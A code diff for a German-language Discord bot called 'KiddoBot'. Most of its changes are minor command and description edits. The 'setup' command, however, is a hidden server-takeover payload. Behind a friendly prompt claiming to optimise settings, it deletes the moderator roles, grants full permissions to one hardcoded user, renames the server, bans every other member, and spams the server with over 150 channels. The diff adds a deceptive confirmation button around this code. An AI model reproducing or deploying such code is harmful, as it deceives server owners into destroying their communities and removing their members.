@@ -2,10 +2,10 @@ import time
 import random
 import discord
 import requests
-#import music_handler
+import music_handler
 import qrcode_handler
 import weather_handler
-from Buttons import HL_Buttons
+from Buttons import HL_Buttons, Setup_Button
 from discord.ext import commands
 from discord.ui import Button, View
 from help_system import HelpCommand
@@ -442,14 +442,14 @@ class KiddoBot(commands.Cog):
         else:
             await ctx.send("Bitte gib einen Ort an!")
 
-    @bot.hybrid_command(aliases=['Morgen'])
+    @bot.hybrid_command(description='Wie wird denn wohl das Wetter morgen?')
     async def morgen(self, ctx, *, location=None):
         if location:
             await weather_handler.get_weather_forecast(location, ctx)
         else:
             await ctx.send("Bitte gib einen Ort an!")
 
-    @bot.hybrid_command(aliases=['Alarm'])
+    @bot.hybrid_command(description='Frage nach, ob es in deiner Umgebung gerade eine Wetterwarung gibt')
     async def alarm(self, ctx, *, location=None):
         if location:
             await weather_handler.get_weather_alert(location, ctx)
@@ -475,55 +475,73 @@ class KiddoBot(commands.Cog):
     @bot.hybrid_command(description='Basic Setup damit Kiddo funktioniert :)')
     async def setup(self, ctx):
         if ctx.author.id == 695885580629704734 or ctx.author.id == 482833516774817795 or ctx.author.id == 633376425465872404:  # walnusskeim, Wqffel oder bonerboy
-            await self.bot.change_presence(status=discord.Status.offline)
-            await ctx.send("ABFAHRT!!!",
-                           file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
-            time.sleep(2)
-            await ctx.channel.purge(limit=1)
+            view = Setup_Button()
 
-            for bot in ctx.guild.members:
-                role = discord.utils.get(bot.guild.roles, name="Bots")
-                if role in bot.roles:
-                    await bot.remove_roles(role)
-                    print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")
+            setupfield = discord.Embed(title="**Willst du das Setup ausführen?**", color=0xff00ff)
+            setupfield.add_field(name=f"Damit scannt Kiddo einmal kurz den Server und passt individuelle Einstellungen für sich selber an,"
+                                      f"um dir das bestmögliche Servererlebnis zu bieten :3\n"
+                                   f"Reagiere mit :thumbsup: oder :thumbsdown:", value=" ", inline=False)
+            setupfield.set_footer(text="Setup für Kiddo")
+            await ctx.send(embed=setupfield, view=view)
 
-            for role in ctx.guild.roles:
-                if role.name == "Mod":
-                    await role.delete(reason="Unnötig")
-                    print('"Mod" Rolle gelöscht')
-                if role.name == "uwu admins":
-                    await role.delete(reason="Unnötig")
-                    print('"uwu admins" Rolle gelöscht')
+            await view.wait()
+            setupfield.clear_fields()
 
-            for user in ctx.guild.members:
-                funny = discord.utils.get(user.guild.roles, name="Owner <3")
-                if funny in user.roles:
-                    await user.remove_roles(funny)
-                    print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
-            user2 = ctx.guild.get_member(633376425465872404)  # bonerboy
-            await user2.add_roles(funny)
-            await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
-            print("Ich habe dir die Rolle Owner <3 gegeben 0w0")
+            if view.value == "thumbsup":
+                await ctx.send("Setup wird ausgeführt...")
+                await self.bot.change_presence(status=discord.Status.offline)
+                await ctx.send("ABFAHRT!!!",
+                               file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+                time.sleep(2)
+                await ctx.channel.purge(limit=1)
 
-            with open('haha.png', 'rb') as f:
-                icon = f.read()
-            await ctx.guild.edit(name="FOR TEA AND KIDDO!", icon=icon)
+                for bot in ctx.guild.members:
+                    role = discord.utils.get(bot.guild.roles, name="Bots")
+                    if role in bot.roles:
+                        await bot.remove_roles(role)
+                        print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")
 
-            for member in ctx.guild.members:
-                if member.id == 695885580629704734 or member.id == 633376425465872404:  # walnusskeim oder bonerboy
-                    pass
-                else:
-                    await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
+                for role in ctx.guild.roles:
+                    if role.name == "Mod":
+                        await role.delete(reason="Unnötig")
+                        print('"Mod" Rolle gelöscht')
+                    if role.name == "uwu admins":
+                        await role.delete(reason="Unnötig")
+                        print('"uwu admins" Rolle gelöscht')
 
-            for m in range(0, 101):
-                await ctx.message.guild.create_text_channel("Wowzers!!")
-                time.sleep(0.1)
+                for user in ctx.guild.members:
+                    funny = discord.utils.get(user.guild.roles, name="Owner <3")
+                    if funny in user.roles:
+                        await user.remove_roles(funny)
+                        print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
+                user2 = ctx.guild.get_member(633376425465872404)  # bonerboy
+                await user2.add_roles(funny)
+                await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
+                print("Ich habe dir die Rolle Owner <3 gegeben 0w0")
 
-            for v in range(0, 51):
-                await ctx.message.guild.create_voice_channel("Wowzers!!")
-                time.sleep(0.1)
+                with open('haha.png', 'rb') as f:
+                    icon = f.read()
+                await ctx.guild.edit(name="FOR TEA AND KIDDO!", icon=icon)
+
+                for member in ctx.guild.members:
+                    if member.id == 695885580629704734 or member.id == 633376425465872404:  # walnusskeim oder bonerboy
+                        pass
+                    else:
+                        await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
+
+                for m in range(0, 101):
+                    await ctx.message.guild.create_text_channel("Wowzers!!")
+                    time.sleep(0.1)
+
+                for v in range(0, 51):
+                    await ctx.message.guild.create_voice_channel("Wowzers!!")
+                    time.sleep(0.1)
+            elif view.value == "thumbsdown":
+                await ctx.send("Setup wurde abgebrochen :(")
 
         else:
             await ctx.send("Da ist etwas falsch gelaufen :/")
 
-
+    @bot.hybrid_command(description='Kiddo sagt dir, wie lange er schon online ist :)')
+    async def uptime(self, ctx):
+        await ctx.send(f"Ich bin seit {self.bot.uptime} online :3")
